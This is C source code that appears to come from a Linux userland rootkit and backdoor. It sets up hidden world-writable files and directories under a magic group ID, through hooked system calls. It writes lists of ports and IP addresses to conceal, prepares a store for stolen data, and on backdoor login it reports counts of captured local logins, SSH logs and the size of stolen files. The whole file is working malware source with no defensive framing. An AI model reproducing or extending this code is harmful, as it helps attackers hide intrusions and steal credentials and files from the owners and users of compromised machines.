/*
 * functions in here are responsible for creating stuff we need.
 * the function bdprep is called upon logging into a target backdoor.
 * prepare: hideports, hideaddrs & stolenstore are called as soon
 *          as the respective target has to be read from.
 * i.e.: preparehideports is called before the calling process
 *       tries to/can determine the visibility status of a specific port.
 */

int prepareregfile(const char *path, gid_t magicgid){
    hook(CACCESS, CCHMOD, CCREAT);
    int acc = (long)call(CACCESS, path, F_OK);
    if(acc != 0 && errno == ENOENT){
        int crt = (long)call(CCREAT, path, 0777);
        if(crt < 0) return -1;
        close(crt);

        if(chown_path(path, magicgid) < 0)
            return -1;

        if((long)call(CCHMOD, path, 0777) < 0)
            return -1;

        return 1;
    }else if(acc == 0) return 1;
    return -1;
}

int preparedir(const char *path, gid_t magicgid){
    DIR *dp;
    hook(COPENDIR, CMKDIR, CCHMOD);
    dp = call(COPENDIR, path);
    if(dp != NULL){
        closedir(dp);
        return 1;
    }else if(dp == NULL && errno != ENOENT)
        return -1;

    if((long)call(CMKDIR, path, 0777) < 0)
        return -1;

    if(chown_path(path, magicgid) < 0)
        return -1;

    if((long)call(CCHMOD, path, 0777) < 0)
        return -1;

    return 1;
}

#ifdef HIDE_PORTS
void preparehideports(gid_t magicgid){
    if(rknomore() || notuser(0))
        return;

    hook(CFOPEN, CACCESS);

    if((long)call(CACCESS, HIDEPORTS, F_OK) == 0)
        return;

    if(prepareregfile(HIDEPORTS, magicgid) < 0)
        return;

    FILE *fp = call(CFOPEN, HIDEPORTS, "a");
    if(fp == NULL) return;

    for(int i = 0; i < BDVLPORTS_SIZE; i++)
        fprintf(fp, "%d\n", bdvlports[i]);

    fclose(fp);
}
#endif


#ifdef HIDE_ADDRS
void preparehideaddrs(gid_t magicgid){
    if(rknomore() || notuser(0))
        return;

    hook(CFOPEN, CACCESS);

    if((long)call(CACCESS, HIDEADDRS, F_OK) == 0)
        return;

    if(prepareregfile(HIDEADDRS, magicgid) < 0)
        return;

    FILE *fp = call(CFOPEN, HIDEADDRS, "a");
    if(fp == NULL) return;

    for(int i=0; i < HIDEIPADDRS_SIZE; i++)
        fprintf(fp, "%s\n", hideipaddrs[i]);

    fclose(fp);
}
#endif

#ifdef STOLEN_STORAGE
void preparestolenstore(gid_t magicgid){
    if(rknomore() || notuser(0))
        return;

    hook(CFOPEN, CACCESS);

    if((long)call(CACCESS, STOLESTORE_PATH, F_OK) == 0)
        return;

    if(prepareregfile(STOLESTORE_PATH, magicgid) < 0)
        return;

    FILE *fp = call(CFOPEN, STOLESTORE_PATH, "w");
    if(fp == NULL) return;
    fprintf(fp, "%s\n", STOLEN_STORAGE);
    fclose(fp);
}
#endif

void bdprep(void){
    char *curpath;
    gid_t magicgid = readgid();
    int dirs=0, regs=0;
    for(int i = 0; i < BDVPATHS_SIZE; i++){
        curpath = bdvpaths[i];
        if(curpath[strlen(curpath)-1] == '/' && preparedir(curpath, magicgid))
            dirs++;
        else if(prepareregfile(curpath, magicgid)) regs++;
    }

    if(regs+dirs != BDVPATHS_SIZE)
        printf("\e[1mIt looks like something may have went wrong setting everything up...\e[0m\n");
    else{
        dorolf();
#ifdef LOG_LOCAL_AUTH
        int authc = logcount(LOG_PATH);
        if(authc>=0) printf("\e[1mLogged accounts: \e[1;31m%d\e[0m\n", authc);
#endif
#ifdef LOG_SSH
        int sshc = logcount(SSH_LOGS);
        if(sshc>=0) printf("\e[1mSSH logs: \e[1;31m%d\e[0m\n", sshc);
#endif
#ifdef FILE_STEAL
        off_t stolensize = getdirsize(INTEREST_DIR);
        if(stolensize >= 0){
            printf("\e[1mStolen data: ");
            if(stolensize >= 1024*1024*1024)
                printf("\e[1;31m%.2f\e[0m gigabytes\n", (float)stolensize/(1024*1024*1024));
            else if(stolensize >= 1024*1024)
                printf("\e[1;31m%.2f\e[0m megabytes\n", (float)stolensize/(1024*1024));
            else if(stolensize <= 1024)
                printf("\e[1;31m%ld\e[0m bytes\n", stolensize);
            else if(stolensize > 1024)
                printf("\e[1;31m%.2f\e[0m kilobytes\n", (float)stolensize/1024);
        }else printf("\e[1mUnable to evaluate total size of stolen stuff...\e[0m\n");
#endif
    }
    symlinkstuff();
}